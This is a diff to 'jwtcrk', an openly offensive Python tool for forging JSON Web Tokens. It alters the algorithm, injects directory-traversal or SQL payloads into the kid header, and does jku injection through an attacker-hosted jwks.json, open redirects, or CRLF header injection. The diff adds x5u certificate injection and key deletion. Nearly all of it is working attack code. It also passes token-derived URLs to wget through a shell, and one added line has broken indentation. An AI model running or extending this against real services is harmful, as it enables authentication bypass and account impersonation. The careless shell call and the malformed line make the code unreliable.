@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 """
-   Copyright 2021 DontPanicO-AT
+   Copyright 2021 © Andrea Tedeschi (DontPanicO) <andreatedeschi95@gmail.com>
 
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
@@ -75,30 +75,31 @@ class Cracker:
         jwtcrk <token> [options]; IF YOU HAVE USED install.py
         
         Positional:
-        token                     [Your JWT.]
+        token                      [Your JWT.]
         
         Optional:
-        -a --alg <alg>            [The algorithm; None, none, HS256, RS256.]
-        -k --key <path>           [The path to the key if it's needed.]
-        -p --payload <name:value> [The field you want to change in the payload.]
-        -d --decode               [Decode the token and quit.]
-           --unverified           [Act as the host does not verify the signature.]
-           --auto-try <hostname>  [If it's present the script will retrieve the key
-                                   using openssl. If the host uses this key to signs
-                                   its token, it will work.]
-           --specify-key <string> [A string used as key.]
-           --inject-kid <exploit> [Try to inject a payload in the kid header; dirtrv, sqli.]
-           --jku-basic <yourURL>  [Basic jku injection. jku attacks are complicated, you need
-                                   some configs. You have to host the jwks.json crafted file
-                                   on your pc or on a domain you own. Pass it to this parameter,
-                                   but don't force a path; jwks have a common path, pass only
-                                   the first part of the url, '/.well-known/jwks.json' will be
-                                   automatically appended. Look at the examples for more details.]
+        -a --alg <alg>             [The algorithm; None, none, HS256, RS256.]
+        -k --key <path>            [The path to the key if it's needed.]
+        -p --payload <key:value>   [The field you want to change in the payload.]
+           --remove-from <sec:key> [A key to remove from a section of the token.]
+        -d --decode                [Decode the token and quit.]
+           --unverified            [Act as the host does not verify the signature.]
+           --auto-try <hostname>   [If it's present the script will retrieve the key
+                                    using openssl. If the host uses this key to signs
+                                    its token, it will work.]
+           --specify-key <string>  [A string used as key.]
+           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli.]
+           --jku-basic <yourURL>   [Basic jku injection. jku attacks are complicated, you need
+                                    some configs. You have to host the jwks.json crafted file
+                                    on your pc or on a domain you own. Pass it to this parameter,
+                                    but don't force a path; jwks have a common path, pass only
+                                    the first part of the url, '/.well-known/jwks.json' will be
+                                    automatically appended. Look at the examples for more details.]
            --jku-redirect <mainURL,yourURl>
-                                  [Try to use an open redirect to make toe jku header point to
-                                   your url. To do this you need to specify the exact place in
-                                   the main url, where your url has to be attached. This is done
-                                   with the keyword HERE. Look at the examples for more details.]
+                                   [Try to use an open redirect to make toe jku header point to
+                                    your url. To do this you need to specify the exact place in
+                                    the main url, where your url has to be attached. This is done
+                                    with the keyword HERE. Look at the examples for more details.]
         
         Examples:
         jwtcrk <token> --decode
@@ -118,12 +119,13 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, unverified=False, decode=False):
+    def __init__(self, token, alg, path_to_key, user_payload, remove_from, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, unverified=False, decode=False):
         """
         :param token: The user input token -> str.
         :param alg: The algorithm for the attack. HS256 or None -> str.
         :param path_to_key: The path to the public.pem, if the alg is HS256 -> str.
-        :param user_payload: What the user want to change in the payload -> str.
+        :param user_payload: What the user want to change in the payload -> list.
+        :param remove: What the user want to delete in the header or in the payload -> list.
         :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
         :param kid: The type of payload to inject in the kid header. DirTrv or SQLi -> str.
         :param specified_key: A string set to be used as key -> str.
@@ -146,15 +148,19 @@ class Cracker:
         self.file = None
         self.key = None
         self.user_payload = user_payload
+        self.remove_from = remove_from
         self.auto_try = auto_try
         self.kid = kid
         self.specified_key = specified_key
         self.jku_basic = jku_basic
         self.jku_redirect = jku_redirect
         self.jku_header_injection = jku_header_injection
+        self.x5u_basic = x5u_basic
         self.unverified = unverified
         self.decode = decode
-        self.jku_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection]
+        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic]
+        self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
+        self.devnull = open(os.devnull, 'wb')
         # print(self.token, self.alg, self.path_to_key, self.user_payload, self.auto_try, self.unverified, self.decode)		# DEBUG
         """Call the validation"""
         self.validation()
@@ -206,31 +212,40 @@ class Cracker:
                 elif self.alg == "None" or self.alg == "none":
                     print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
                 elif self.alg == "rs256" or self.alg == "RS256":
-                    if not any(arg is not None for arg in self.jku_args):
+                    if not any(arg is not None for arg in self.jwks_args):
                         print(f"{Bcolors.FAIL}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
                         sys.exit(1)
                     if self.alg == "rs256":
                         self.alg = "RS256"
         """Force self.alg to RS256 for jku attacks"""
-        if any(arg is not None for arg in self.jku_args):
-            if len(list(filter(lambda x: x is not None, self.jku_args))) > 1:
-                print(f"{Bcolors.FAIL}ERROR: You can't use two jku injections at the same time.{Bcolors.ENDC}")
+        if any(arg is not None for arg in self.jwks_args):
+            if len(list(filter(lambda x: x is not None, self.jwks_args))) > 1:
+                print(f"{Bcolors.FAIL}ERROR: You can't use two jku or x5u injections at the same time.{Bcolors.ENDC}")
                 sys.exit(1)
             if self.alg is not None and self.alg != "RS256":
-                print(f"{Bcolors.WARNING}WARNING: With jku injections, alg will be forced to RS256.{Bcolors.ENDC}")
+                print(f"{Bcolors.WARNING}WARNING: With jku/x5u injections, alg will be forced to RS256.{Bcolors.ENDC}")
             self.alg = "RS256"
         """Validate key"""
         # MAYBE THIS STEP COULD BE INCLUDED IN THE PREVIOUS ONE???
-        if any(arg is not None for arg in self.jku_args):
+        if any(arg is not None for arg in self.jwks_args):
             other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key]
             """With jku, you can't use other key related args"""
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
                 print(f"{Bcolors.FAIL}ERROR: please don't pass any key related args with jku attacks.{Bcolors.ENDC}")
                 sys.exit(2)
-            """Generate a key with OpenSSL"""
-            key = OpenSSL.crypto.PKey()
-            key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
-            self.key = key
+            if not self.x5u_basic:
+                """Generate a key with OpenSSL"""
+                key = OpenSSL.crypto.PKey()
+                key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
+                self.key = key
+            else:
+                subprocess.run(self.x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull)
+                """Read the key from private.pem"""
+                key_file = open("key.pem", 'r')
+                key_read = key_file.read()
+                key_file.close()
+                key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, key_read)
+                self.key = key
             """The key is converted in a cryptography.hazmat.backends.openssl.rsa._RSAPrivateKey object"""
             self.key.priv = key.to_cryptography_key()
             """Same but _RSAPublicKey object"""
@@ -284,7 +299,7 @@ class Cracker:
         parameters have been called along with -d itself.
 
         """
-        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect, self.jku_header_injection]
+        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect, self.jku_header_injection, self.remove_from, self.x5u_basic]
         if any(arg is not None for arg in other_args) or self.unverified:
             print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
         print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
@@ -300,7 +315,7 @@ class Cracker:
         Using json, the function create two dictionaries of self.original_token_header and self.original_token_payload,
         in order to access and modify them as dict object. If we have some header injection like kid or jku, the script
         modifys those headers with the related payload.
-        It changes the algorithm to the one specified by the user, then look he has also declared any payload change. 
+        It changes the algorithm to the one specified by the user, then look he has also declared any payload change.
         If he has, the function calls the change_payload method, for each change stored in self.user_payload.
 
         N.B. self.user_payload is a list and, any time the user call a -p, the value went stored in another list inside
@@ -329,19 +344,40 @@ class Cracker:
             your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = main_url.replace("HERE", your_url)
-        elif self.jku_header_injection:
+	        elif self.jku_header_injection:
             if "jku" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}ERROR: JWT header has no jku.{Bcolors.ENDC}")
                 sys.exit(2)
             body = self.jku_via_header_injection(header_dict)
             content_length = len(body)
-            body = body.replace("[", "%5b").replace("]", "%5d").replace("{", "%7b").replace("}", "%7d").replace(" ", "%20")
+            body = Cracker.url_escape(body, "[]{}")
             injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
             url = self.jku_header_injection.replace("HERE", injection)
             header_dict['jku'] = url
+        elif self.x5u_basic:
+            if "x5u" not in header_dict.keys():
+                print(f"{Bcolors.FAIL}ERROR: JWT header has no x5u.{Bcolors.ENDC}")
+                sys.exit(2)
+            your_url = self.x5u_basic.rstrip("/") + "/.well-known/jwks.json"
+            self.x5u_basic_attack(header_dict)
+            header_dict['x5u'] = your_url
         if self.user_payload:
             for item in self.user_payload:
                 payload_dict = Cracker.change_payload(item[0], payload_dict)
+        if self.remove_from:
+            for item in self.remove_from:
+                from_dict = item[0].split(":")[0]
+                to_del = item[0].split(":")[1]
+                if from_dict != "header" and from_dict != "payload":
+                    print(f"{Bcolors.FAIL}You can delete keys only from header or payload{Bcolors.ENDC}")
+                    sys.exit(2)
+                if from_dict == "header" and to_del == "alg" or from_dict == "header" and to_del == "typ":
+                    print(f"{Bcolors.FAIL}Deleting key {to_del} will invalidate the token{Bcolors.ENDC}")
+                    sys.exit(1)
+                if from_dict == "header":
+                    header_dict = Cracker.delete_key(header_dict, to_del)
+                elif from_dict == "payload":
+                    payload_dict = Cracker.delete_key(payload_dict, to_del)
         new_header = json.dumps(header_dict).replace(", ", ",").replace(": ", ":")
         new_payload = json.dumps(payload_dict).replace(", ", ",").replace(": ", ":")
         return new_header, new_payload
@@ -353,10 +389,15 @@ class Cracker:
         it to change the modulus and the esponent with the ones of our generated key. Then creates a new file in
         .well-known/jwks.json and write into it the dumps of the dict.
         """
-        devnull_ = open(os.devnull, 'wb')
         command = "wget " + header['jku']
-        command_output = subprocess.check_output(command, shell=True, stdin=devnull_, stderr=devnull_)
-        jwks = open("jwks.json")
+        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        for file in os.listdir():
+            if file.endswith(".json"):
+                filename = file
+                break
+        else:
+            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
+        jwks = open(filename)
         jwks_dict = json.load(jwks)
         jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
             (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
@@ -366,8 +407,8 @@ class Cracker:
         ).decode('utf-8').rstrip("=")
         file = open(f"{cwd}crafted/jwks.json", 'w')
         file.write(json.dumps(jwks_dict))
-        devnull_.close()
         file.close()
+        os.remove(filename)
 
     def jku_via_header_injection(self, header):
         """
@@ -377,10 +418,15 @@ class Cracker:
 
         :return: The crafted jwks string in an http response body format.
         """
-        devnull_ = open(os.devnull, 'wb')
         command = "wget " + header['jku']
-        command_output = subprocess.check_output(command, shell=True, stdin=devnull_, stderr=devnull_)
-        jwks = open("jwks.json")
+        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        for file in os.listdir():
+            if file.endswith(".json"):
+                filename = file
+                break
+        else:
+            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
+        jwks = open(filename)
         jwks_dict = json.load(jwks)
         jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
             (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
@@ -389,8 +435,28 @@ class Cracker:
             (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
         ).decode('utf-8').rstrip("=")
         body = json.dumps(jwks_dict)
-        devnull_.close()
+        os.remove(filename)
         return body
+
+    def x5u_basic_attack(self, header):
+        download = "wget " + header['x5u']
+        download_output = subprocess.check_output(download, shell=True, stdin=self.devnull, stderr=self.devnull)
+        # Retrieve the right filename    TODO: Implement it in a better way
+        for file in os.listdir():
+            if file.endswith(".json"):
+                filename = file
+                break
+        else:
+            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
+        with open("testing.crt", 'r') as cert_file:
+            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
+        jwks = open(filename)
+        jwks_dict = json.load(jwks)
+        jwks_dict['keys'][0]['x5c'] = x5c_
+        file = open("crafted/jwks.json", 'w')
+        file.write(json.dumps(jwks_dict))
+        file.close()
+        os.remove(filename)
 
     def select_signature(self, partial_token):
         """
@@ -513,22 +579,22 @@ class Cracker:
 
     @staticmethod
     def url_escape(string, chars, spaces=True):
-    """
-    :param string: The string to url encode -> str
-    :param chars: The only characters to encode in the string -> str
-    :param spaces: If true automatically appends a space to the characters to encode -> bool
+        """
+        :param string: The string to url encode -> str
+        :param chars: The only characters to encode in the string -> str
+        :param spaces: If true automatically appends a space to the characters to encode -> bool
 
-    The function, given a string, replaces the characters specified in the chars parameter with their url encoded one.
-    By default, if the space character is not specified in the chars parameter, the function automatically appends it.
+        The function, given a string, replaces the characters specified in the chars parameter with their url encoded one.
+        By default, if the space character is not specified in the chars parameter, the function automatically appends it.
 
-    :return: The original string with the specified characters url encoded
-    """
-    if " " not in chars and spaces:
-        chars += " "
-    encoded = [urllib.parse.quote(char) for char in chars]
-    for i in range(len(chars)):
-        string = string.replace(chars[i], encoded[i])
-    return string
+        :return: The original string with the specified characters url encoded
+        """
+        if " " not in chars and spaces:
+            chars += " "
+        encoded = [urllib.parse.quote(char) for char in chars]
+        for i in range(len(chars)):
+            string = string.replace(chars[i], encoded[i])
+        return string
 
     @staticmethod
     def decode_encoded_token(iterable):
@@ -574,6 +640,24 @@ class Cracker:
             print(f"{Bcolors.WARNING}WARNING: can't find {user_payload_name} in the token payload. It will be added{Bcolors.ENDC}")
         iterable[user_payload_name] = user_payload_value
         return iterable
+
+    @staticmethod
+    def delete_key(iterable, key):
+        """
+        :param iterable: The header dictionary or the payload one -> dict.
+        :param key: A key the user wants to delete from the dictionary -> str.
+
+        The function first checks that the specified key exists in the dictionary, else return an error and quits out.
+        If the key exists, it delete the related item from the dictionary.
+
+        :return: The dictionary with the specified item deleted
+        """
+        if key not in iterable.keys():
+            print(f"{Bcolors.FAIL}The key {key} does not exists in the specified section.{Bcolors.ENDC}")
+            sys.exit(2)
+        else:
+            del iterable[key]
+            return iterable
 
     @staticmethod
     def encode_token_segment(json_string):
@@ -660,8 +744,13 @@ class Cracker:
         # print(final_token.split(".")[0] == self.token_dict['header'], final_token.split(".")[1] == self.token_dict['payload'])	# DEBUG
         if self.file is not None:
             self.file.close()
-        if os.path.exists("jwks.json"):
-        	os.remove("jwks.json")
+        if os.path.exists("key.pem"):
+            os.remove("key.pem")
+        if os.path.exists("cert.pem"):
+            os.remove("cert.pem")
+        if os.path.exists("testing.crt"):
+            os.remove("testing.crt")
+        self.devnull.close()
         sys.exit(0)
 
 
@@ -696,6 +785,10 @@ if __name__ == '__main__':
                         help="Just decode the token and quit.",
                         required=False
                         )
+    parser.add_argument("--remove-from", action="append", nargs="*",
+                        help="The section of the token, and the key name to delete as key:value pairs",
+                        metavar="<section>:<key>", required=False,
+                        )
     parser.add_argument("--unverified", action="store_true",
                         help="Treat the host as it doesn't verify the signature",
                         required=False
@@ -723,14 +816,18 @@ if __name__ == '__main__':
     parser.add_argument("--jku-body",
                         help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
                         metavar="<mainURL>", required=False
-                       )
+                        )
+    parser.add_argument("--x5u-basic",
+                        help="Specify your ip or domain to host the jwks.json file",
+                        metavar="<yourURL>", required=False
+                        )
 
     # Parse arguments
     args = parser.parse_args()
 
     cracker = Cracker(
-        args.token, args.alg, args.key, args.payload, args.auto_try,
-        args.inject_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_body, args.unverified, args.decode
+        args.token, args.alg, args.key, args.payload, args.remove_from, args.auto_try, args.inject_kid,
+        args.specify_key, args.jku_basic, args.jku_redirect, args.jku_body, args.x5u_basic, args.unverified, args.decode
     )
     # print(args.payload)	# DEBUG
     # print(cracker.key)	# DEBUG
